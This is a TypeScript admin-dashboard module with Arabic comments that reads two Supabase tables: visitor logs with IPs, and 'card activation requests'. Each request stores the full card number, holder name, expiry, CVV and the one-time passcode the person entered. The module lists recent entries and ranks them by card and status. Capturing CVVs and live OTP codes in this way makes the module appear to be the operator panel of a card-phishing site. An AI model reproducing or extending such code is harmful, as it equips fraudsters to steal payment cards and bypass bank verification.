export interface VisitorStats {
  totalVisits: number;
  visitsToday: number;
  uniqueIps: number;
  uniqueIpsToday: number;
  daily: { date: string; visits: number }[];
  topPages: { path: string; visits: number }[];
  recentVisits: {
    id: string;
    path: string;
    ip: string | null;
    user_agent: string | null;
    referrer: string | null;
    created_at: string;
  }[];
}

export interface CardRequestsStats {
  totalRequests: number;
  requestsToday: number;
  /** عدد الطلبات لكل حالة (محسوبة من كل الصفوف المجلوبة وليس آخر 50 فقط). */
  byStatus: Record<string, number>;
  topCards: { card_title: string; requests: number }[];
  recentRequests: {
    id: string;
    client_ref: string;
    card_title: string;
    card_brand: string | null;
    card_number: string | null;
    card_holder_name: string | null;
    expiry_month: string | null;
    expiry_year: string | null;
    cvv: string | null;
    activation_status: string;
    otp_value: string | null;
    otp_attempts: number;
    approved_at: string | null;
    ip: string | null;
    user_agent: string | null;
    created_at: string;
  }[];
}

export async function loadCardRequests(): Promise<CardRequestsStats> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

  const { data, error } = await supabaseAdmin
    .from("card_activation_requests")
    .select(
      "id, client_ref, card_title, card_brand, card_number, card_holder_name, expiry_month, expiry_year, cvv, activation_status, otp_value, otp_attempts, approved_at, ip, user_agent, created_at",
    )
    .order("created_at", { ascending: false })
    .limit(500);

  if (error) throw error;

  const requests = data ?? [];
  const todayKey = new Date().toISOString().slice(0, 10);
  const perCard = new Map<string, number>();
  const byStatus: Record<string, number> = {};
  let requestsToday = 0;

  for (const req of requests) {
    perCard.set(req.card_title, (perCard.get(req.card_title) ?? 0) + 1);
    byStatus[req.activation_status] = (byStatus[req.activation_status] ?? 0) + 1;
    if (req.created_at.slice(0, 10) === todayKey) requestsToday += 1;
  }

  return {
    totalRequests: requests.length,
    requestsToday,
    byStatus,
    topCards: [...perCard.entries()]
      .sort((a, b) => b[1] - a[1])
      .slice(0, 8)
      .map(([card_title, count]) => ({ card_title, requests: count })),
    recentRequests: requests.slice(0, 50),
  };
}

export async function loadVisitorStats(): Promise<VisitorStats> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

  const since = new Date();
  since.setUTCDate(since.getUTCDate() - 30);
  since.setUTCHours(0, 0, 0, 0);

  const { data, error } = await supabaseAdmin
    .from("site_visits")
    .select("id, path, ip, user_agent, referrer, created_at")
    .gte("created_at", since.toISOString())
    .order("created_at", { ascending: false })
    .limit(5000);

  if (error) throw error;

  const visits = data ?? [];
  const todayKey = new Date().toISOString().slice(0, 10);

  const ips = new Set<string>();
  const ipsToday = new Set<string>();
  let visitsToday = 0;
  const perDay = new Map<string, number>();
  const perPath = new Map<string, number>();

  for (const visit of visits) {
    const day = visit.created_at.slice(0, 10);
    perDay.set(day, (perDay.get(day) ?? 0) + 1);
    perPath.set(visit.path, (perPath.get(visit.path) ?? 0) + 1);
    if (visit.ip) ips.add(visit.ip);
    if (day === todayKey) {
      visitsToday += 1;
      if (visit.ip) ipsToday.add(visit.ip);
    }
  }

  // Last 14 days, oldest first, including empty days.
  const daily: { date: string; visits: number }[] = [];
  for (let i = 13; i >= 0; i--) {
    const d = new Date();
    d.setUTCDate(d.getUTCDate() - i);
    const key = d.toISOString().slice(0, 10);
    daily.push({ date: key, visits: perDay.get(key) ?? 0 });
  }

  const topPages = [...perPath.entries()]
    .sort((a, b) => b[1] - a[1])
    .slice(0, 8)
    .map(([path, count]) => ({ path, visits: count }));

  return {
    totalVisits: visits.length,
    visitsToday,
    uniqueIps: ips.size,
    uniqueIpsToday: ipsToday.size,
    daily,
    topPages,
    recentVisits: visits.slice(0, 50),
  };
}

// ملاحظة: لا توجد دوال سيرفر عامة هنا — كل القراءة تمر عبر الدوال المحمية
// بـ requireAdmin في admin.functions.ts (تُستخدم من /admin و /visitors).
